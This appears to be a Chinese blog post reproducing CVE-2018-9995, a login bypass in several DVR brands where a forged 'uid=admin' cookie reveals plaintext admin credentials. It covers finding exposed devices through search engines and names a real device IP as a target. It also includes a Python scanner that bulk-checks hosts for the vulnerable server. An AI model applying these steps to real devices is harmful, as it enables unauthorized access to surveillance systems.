# DVR登录绕过漏洞_CVE-2018-9995漏洞复现 - 雨中落叶 - 博客园

> 原文：[https://www.cnblogs.com/yuzly/p/11105086.html](https://www.cnblogs.com/yuzly/p/11105086.html)

DVR登录绕过漏洞_CVE-2018-9995漏洞复现

**一、漏洞描述**

此漏洞允许攻击者通过修改”Cookie:uid=admin”之后访问特定DVR的控制面板,返回此设备的明文管理员凭证。

**二、影响软件以及版本**

Novo

CeNova

QSee

Pulnix

XVR 5 in 1 (title: "XVR Login")

Securus, - Security. Never Compromise !! -

Night OWL

DVR Login

HVR Login

MDVR Login

**三、漏洞复现**

1、搜索引擎获取有可能存在漏洞的设备

使用shodan、google等搜索引擎

　　![](../Images/87197316133ad2e9562b255d26420b77.png)

　　![](../Images/a9df4b0943993f10bc96fe6418845a3b.png)

2、访问[http://114.33.109.175/login.rsp](http://114.33.109.175/login.rsp)

　　![](../Images/f410bb6faaeab2097847e42c9d189061.png)

3、burp抓包,构造poc，放包发现获得登录凭证

　　![](../Images/f230971d08b9c47e3ecc3c2a5569a76e.png)

4、使用获得账户密码登录,成功登录

　　![](../Images/973d0ad458a679f4b3ada6da06cd4595.png)

5、批量检查是否存在CVE-2018-9995漏洞(poc)，脚本如下

```
import sys 
import requests
import re

def check_host(host): try:

        print("Checking : %s"%host)

        url = 'http://' + host+'/login.rsp' rr= requests.get(url,timeout=30,allow_redirects=False) if rr.status_code == 200 and re.findall("GNU rsp/1.0", rr.headers["Server"]):

            print("[*] CVE-2018-9995 Detection :Url is %s"%url)

            ff=open('result.txt','a+')

            ff.write('%s\n'%(url))

    except:

        pass if __name__ == '__main__': if len(sys.argv) < 2:

        print("""Usage: Python3 CVE-2018-9995.py host.txt
 host.txt:127.0.0.1:8080 or baidu.com """)

    if len(sys.argv) >= 2:

        file = open(sys.argv[1]) for i in file:

            i = i.strip()

            check_host(i)

        file.close()
```

6、运行脚本

　　![](../Images/45afb2eda0ea5334b60f36d246217554.png)